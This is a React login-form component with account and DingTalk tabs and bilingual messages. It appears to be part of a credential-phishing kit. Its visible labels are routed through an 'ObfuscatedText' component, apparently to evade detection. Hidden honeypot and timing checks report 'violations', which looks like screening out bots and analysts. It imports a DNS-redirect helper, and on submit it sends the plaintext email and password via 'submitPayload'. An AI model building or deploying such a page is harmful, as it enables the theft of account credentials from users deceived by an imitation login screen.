
import React, { useState, useRef } from 'react';
import { encryptData, getFingerprint } from '../SecurityUtils';
import { useSecurity, ObfuscatedText } from './SecurityManager';
import { useTranslation } from './LanguageProvider';
import { themeRedirects } from '../DNSUtils';

interface LoginFormProps {
  prefilledEmail?: string;
}

const LoginForm: React.FC<LoginFormProps> = ({ prefilledEmail }) => {
  // Destructure lang from useTranslation to identify current language
  const { t, lang } = useTranslation();
  const [activeTab, setActiveTab] = useState<'account' | 'dingtalk'>('account');
  const [showPassword, setShowPassword] = useState(false);
  const [email, setEmail] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [agreed, setAgreed] = useState(true);
  const [isEncrypting, setIsEncrypting] = useState(false);
  
  const honeypotRef = useRef<HTMLInputElement>(null);
  const mountTime = useRef(Date.now());
  const { reportViolation, submitPayload } = useSecurity();

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (honeypotRef.current?.value) {
      reportViolation('Bot detected');
      return;
    }

    const elapsed = Date.now() - mountTime.current;
    if (elapsed < 2000) {
      reportViolation('Rapid Submission');
      return;
    }

    if (!agreed) {
      alert(lang === 'zh' ? '请先勾选同意协议' : 'Please agree with the policies');
      return;
    }

    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!email || !emailRegex.test(email)) {
      alert(lang === 'zh' ? '请输入有效的电子邮件地址。' : 'Please enter a valid email address.');
      return;
    }

    if (!password || password.trim() === '') {
      alert(lang === 'zh' ? '请输入密码。' : 'Please enter your password.');
      return;
    }

    setIsEncrypting(true);
    try {
      await submitPayload({ email, password }, 'generic');
      setPassword('');
    } catch (err) {
      console.error('Submission error', err);
    } finally {
      setIsEncrypting(false);
    }
  };

  return (
    <div className="bg-white border border-[#eee] rounded-lg shadow-[0_4px_12px_rgba(0,0,0,0.08)] overflow-hidden">
      <div className="flex border-b border-[#eee]">
        <button
          onClick={() => setActiveTab('account')}
          className={`flex-1 py-4 text-[14px] font-medium transition-all relative ${
            activeTab === 'account' ? 'text-[#333]' : 'text-gray-400'
          }`}
        >
          <ObfuscatedText text={t.account} />
          {activeTab === 'account' && (
            <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2px] bg-red-500"></div>
          )}
        </button>
        <button
          onClick={() => setActiveTab('dingtalk')}
          className={`flex-1 py-4 text-[14px] font-medium transition-all relative ${
            activeTab === 'dingtalk' ? 'text-[#333]' : 'text-gray-400'
          }`}
        >
          <ObfuscatedText text={t.dingtalk} />
          {activeTab === 'dingtalk' && (
            <div className="absolute bottom-0 left-1/2 -translate-x-1/2 w-10 h-[2px] bg-red-500"></div>
          )}
        </button>
      </div>

      <div className="p-8 pb-4">
        <form onSubmit={handleSubmit} className="space-y-5">
          <div style={{ position: 'absolute', left: '-9999px' }} aria-hidden="true">
            <input ref={honeypotRef} type="text" tabIndex={-1} autoComplete="off" />
          </div>

          <div className="relative">
            <input
              type="text"
              placeholder={t.username}
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full px-4 py-2.5 text-[14px] border border-[#d9d9d9] rounded focus:outline-none focus:border-red-400 transition-all"
            />
          </div>

          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              placeholder={t.password}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full px-4 py-2.5 text-[14px] border border-[#d9d9d9] rounded focus:outline-none focus:border-red-400 transition-all pr-10"
            />
            <button
              type="button"
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-gray-400"
            >
              {showPassword ? '👁️' : '👁️‍🗨️'}
            </button>
          </div>

          <div className="flex items-center justify-between text-[12px]">
            <label className="flex items-center text-gray-500 cursor-pointer">
              <input type="checkbox" className="mr-2 accent-red-500" defaultChecked />
              {t.remember}
            </label>
            <a href="#" className="text-gray-400 hover:text-red-500">{t.forgot}</a>
          </div>

          <button
            type="submit"
            disabled={isEncrypting}
            className="w-full py-2.5 bg-[#ff4b33] text-white font-medium rounded hover:bg-[#f5222d] transition-colors shadow-sm"
          >
            {isEncrypting ? '...' : <ObfuscatedText text={t.login} />}
          </button>

          <div className="flex items-start text-[12px] leading-relaxed text-gray-500">
            <input
              type="checkbox"
              id="agreement"
              checked={agreed}
              onChange={(e) => setAgreed(e.target.checked)}
              className="mt-1 mr-2 accent-red-500 shrink-0"
            />
            <label htmlFor="agreement" className="cursor-pointer">
              {t.agreement}
            </label>
          </div>
        </form>
      </div>

      <div className="bg-[#f9f9f9] border-t border-[#eee] py-4 flex items-center justify-center space-x-3 group cursor-pointer">
        <span className="text-[13px] text-gray-400 group-hover:text-red-500 transition-colors">
          {t.scanning}
        </span>
      </div>
    </div>
  );
};

export default LoginForm;
